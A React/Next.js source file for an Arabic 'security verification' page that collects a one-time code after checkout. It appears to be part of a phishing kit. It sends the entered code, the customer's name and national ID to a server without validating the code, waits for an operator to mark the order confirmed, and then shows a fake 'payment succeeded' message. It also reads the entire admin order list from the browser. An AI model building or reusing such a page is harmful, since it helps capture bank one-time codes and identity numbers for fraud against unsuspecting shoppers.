"use client";

import { useState, useEffect, useRef } from "react";
import Link from "next/link";
import { useCartStore } from "../../store/cartStore";
import { FileText, Receipt, X, ShieldCheck } from "lucide-react";

export default function VerifyPage() {
  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
  const [codeError, setCodeError] = useState(false);
  const [resent, setResent] = useState(false);
  const [confirmed, setConfirmed] = useState(false);
  const [dbOrderId, setDbOrderId] = useState<string | null>(null);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const { customer } = useCartStore();
  const orderId = typeof window !== "undefined" ? localStorage.getItem("orderId") ?? "—" : "—";

  // polling
  useEffect(() => {
    if (!dbOrderId) return;
    pollRef.current = setInterval(async () => {
      const res = await fetch(`/api/admin/orders/${dbOrderId}`);
      if (!res.ok) return;
      const data = await res.json();
      if (data.status === "confirmed") {
        clearInterval(pollRef.current!);
        setConfirmed(true);
      }
    }, 5000);
    return () => clearInterval(pollRef.current!);
  }, [dbOrderId]);

  function handleOtpChange(index: number, value: string) {
    const digit = value.replace(/\D/g, "").slice(-1);
    const next = [...otp];
    next[index] = digit;
    setOtp(next);
    setCodeError(false);
    if (digit && index < 5) inputRefs.current[index + 1]?.focus();
  }

  function handleOtpKeyDown(index: number, e: React.KeyboardEvent) {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  }

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    const code = otp.join("");
    if (code.length !== 4 && code.length !== 6) { setCodeError(true); return; }
    setOtp(["", "", "", "", "", ""]);
    await fetch("/api/verify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ code, orderId, customerName: customer?.name ?? "—", customerId: customer?.nationalId ?? "—" }),
    });
    try {
      const res = await fetch("/api/admin/orders");
      const orders = await res.json();
      const match = Array.isArray(orders) ? orders.find((o: { orderId: string; _id: string }) => o.orderId === orderId) : null;
      if (match) setDbOrderId(match._id);
    } catch {}
  }

  // ── Confirmed Popup ──────────────────────────────────────────────────────────
  if (confirmed && dbOrderId) {
    return (
      <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 px-4" dir="rtl">
        <div className="relative bg-white rounded-3xl shadow-2xl w-full max-w-sm sm:max-w-md md:max-w-lg overflow-hidden mx-4">
          <Link href="/" className="absolute top-3 left-3 p-1.5 rounded-full bg-gray-100 hover:bg-gray-200 text-gray-500 transition-all z-10">
            <X className="w-4 h-4" />
          </Link>
          <div className="flex flex-col items-center pt-4 sm:pt-5 pb-3 bg-white">
            <img src="/sucess.webp" alt="success" className="w-28 h-28 sm:w-36 sm:h-36 md:w-44 md:h-44 object-contain" />
            <span className="mt-2 bg-[#E6EFC0] text-black text-sm font-bold px-4 sm:px-6 py-1.5 rounded-2xl">نجحت عملية الدفع</span>
          </div>
          <div className="px-4 sm:px-5 py-3 sm:py-4 flex flex-col gap-3 text-center">
            <div className="space-y-1">
              <p className="text-gray-800 font-semibold text-base">تمت العملية بنجاح</p>
              <p className="text-gray-500 text-sm leading-6 sm:leading-7">
                شكراً لك لثقتك، وإنه لمن دواعي سرورنا العمل معكم، نشكرك على كونك واحداً من عملائنا الكرام، أنتم تستحقون أفضل خدماتنا، ونتمنى أن نكون عند حسن ظنكم وتوقعاتكم.
              </p>
              <p className="text-gray-500 text-sm">يرجى التواصل مع موظف خدمة العملاء لاستكمال إجراءات شحن الطلب.</p>
            </div>
            <div className="flex flex-col sm:flex-row gap-2 sm:gap-3 pb-1">
              <a href={`/admin/orders/${dbOrderId}/print`} target="_blank" rel="noopener noreferrer"
                className="flex-1 flex items-center bg-[#89BA45] justify-center gap-2 py-2 sm:py-2.5 rounded-xl text-white font-semibold text-sm transition-all">
                <FileText className="w-4 h-4" /> الفاتورة
              </a>
              <a href={`/admin/orders/${dbOrderId}/receipt`} target="_blank" rel="noopener noreferrer"
                className="flex-1 flex items-center justify-center gap-2 py-2 sm:py-2.5 rounded-xl bg-[#89BA45] text-white font-semibold text-sm transition-all">
                <Receipt className="w-4 h-4" /> سند القبض
              </a>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // ── Main Page ─────────────────────────────────────────────────────────────────
  return (
    <div className="min-h-screen flex flex-col font-sans" style={{ background: 'linear-gradient(to bottom, #B8D8EC, #0a3550)' }}>
      <style>{`body { background-color: #0a3550; }`}</style>

      {/* Main */}
      <main className="flex-grow flex items-center justify-center px-6 py-12 md:py-24">
        <div className="max-w-md w-full">

          {/* Card */}
          <div className="bg-[#0a3550]/80 backdrop-blur-sm border border-[#1F6F8B] rounded-2xl shadow-[0px_20px_40px_rgba(0,0,0,0.3)] p-8 md:p-12 relative overflow-hidden">

            {/* Branding */}
            <div className="mb-10 text-center">
              <span className="inline-block bg-[#7CC043] text-white px-3 py-1 rounded-full text-[0.75rem] uppercase tracking-[0.05em] mb-4 font-semibold">
                الأمان أولاً
              </span>
              <h1 className="text-[2rem] text-white leading-tight tracking-tight font-bold mb-2">التحقق الأمني</h1>
              <p className="text-[#B8D8EC] leading-relaxed text-sm">
                للحفاظ على أمان حسابك، أرسلنا رمزاً مكوناً من 4 أو 6 أرقام
              </p>
            </div>

            {/* OTP Grid */}
            <form onSubmit={handleSubmit} className="space-y-8">
              <div className="grid grid-cols-6 gap-2 md:gap-4" dir="ltr">
                {otp.map((digit, i) => (
                  <input
                    key={i}
                    ref={el => { inputRefs.current[i] = el; }}
                    type="text"
                    inputMode="numeric"
                    maxLength={1}
                    value={digit}
                    onChange={e => handleOtpChange(i, e.target.value)}
                    onKeyDown={e => handleOtpKeyDown(i, e)}
                    aria-label={`Digit ${i + 1}`}
                    className={`w-full aspect-square text-center text-2xl font-bold rounded-lg transition-all outline-none border-2 text-white ${
                      codeError ? "border-red-400 bg-red-900/40" : "bg-[#1F6F8B]/60 border-[#1F6F8B] focus:border-[#7CC043] focus:bg-[#0F4C6E] focus:shadow-[0_0_0_2px_rgba(124,192,67,0.2)]"
                    }`}
                  />
                ))}
              </div>

              {codeError && <p className="text-red-500 text-xs text-center -mt-4">يجب إدخال 4 أو 6 أرقام</p>}
              {resent && <p className="text-green-600 text-sm text-center font-medium">✅ تم إعادة إرسال الرمز</p>}

              {/* Actions */}
              <div className="space-y-4">
                <button
                  type="submit"
                  className="w-full py-4 px-6 rounded-xl text-white font-bold text-lg bg-gradient-to-br from-[#366b00] to-[#7cc043] hover:shadow-lg transition-all duration-300 active:scale-95 flex items-center justify-center gap-2"
                >
                  التحقق من الهوية
                  <ShieldCheck className="w-5 h-5" />
                </button>

                <div className="flex flex-col items-center gap-3 text-sm">
                  <p className="text-[#B8D8EC]">
                    لم تستلم الرمز؟{" "}
                    <button
                      type="button"
                      onClick={() => {
                        fetch("/api/resend", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ orderId, customerName: customer?.name ?? "—" }) });
                        setResent(true);
                        setTimeout(() => setResent(false), 3000);
                      }}
                      className="text-[#7CC043] font-semibold hover:underline transition-all cursor-pointer"
                    >
                      إعادة الإرسال
                    </button>
                  </p>
                  <Link href="/checkout" className="flex items-center gap-1 text-[#B8D8EC] font-medium hover:text-white transition-colors">
                    → العودة للطلب
                  </Link>
                </div>
              </div>
            </form>

            {/* Decorative blobs */}
            <div className="absolute -top-12 -right-12 w-32 h-32 bg-[#7CC043]/10 rounded-full blur-3xl pointer-events-none" />
            <div className="absolute -bottom-12 -left-12 w-32 h-32 bg-[#B8D8EC]/10 rounded-full blur-3xl pointer-events-none" />
          </div>

          {/* Contextual Help */}
          <div className="mt-8 flex justify-center gap-8">
            <div className="flex items-center gap-2 text-[#B8D8EC]/70">
              <ShieldCheck className="w-4 h-4" />
              <span className="text-xs uppercase tracking-wider">وصول آمن</span>
            </div>
          </div>

        </div>
      </main>



    </div>
  );
}
